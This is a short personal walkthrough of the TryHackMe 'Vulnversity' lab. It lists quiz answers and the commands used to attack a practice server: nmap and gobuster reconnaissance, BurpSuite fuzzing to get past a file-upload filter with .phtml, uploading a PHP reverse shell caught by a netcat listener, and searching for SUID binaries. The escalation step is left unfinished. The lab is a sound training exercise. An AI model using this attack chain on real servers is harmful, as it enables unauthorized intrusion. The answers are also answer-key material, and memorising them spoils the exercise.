# Vulnversity

Learn about active recon, web app attacks and privilege escalation.

[Vulnversity](https://tryhackme.com/room/vulnversity)

## Summary

1. Use `nmap` to discover hosts and services on a computer network
2. Use `gobuster` to brute force and locate a directory that you can use to upload a shell to.
3. Use `BurpSuite` to discover which filetypes are uploadable
4. `nc`: NetCat, used for opening TCP / UDP connections

## Solutions

1. Deploy Machine

2. `nmap -sV <IPAddress>`

    Discover hosts and services on a computer network

    1. `nmap -sV <IPAddress>`
    2. 6
    3. 3.5.12
    4. 400
    5. DNS (-n tells nmap to not resolve DNS)
    6. Ubuntu
    7. 3333

3. `gobuster dir -u http://<IPAddress>:3333 -w <WordListPath>` locate a directory that you can use to upload a shell to.

    1. `/internal`

4. Upload and execute our payload that will lead to compromising the web server.

   1. `.php`
   2. pass
   3. `.phtml`
      1. In BurpSuite, intercept the target file uploader domain, and in Intruder, load the word list and uncheck encode option
   4. Download and upload the script.
      1. If on mac os, `nc -l <ip> <port>` where `ip` and `port` must match the IP and Port specified in `./php-reverse-shell.phtml`.
   5. `ls -lah /home` -> `bill`
   6. `cat user.txt`

5. Privilege Escalation

   1. `find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null` -> `/bin/systemctl`
   2. this some weird shit i cannot understand yet...
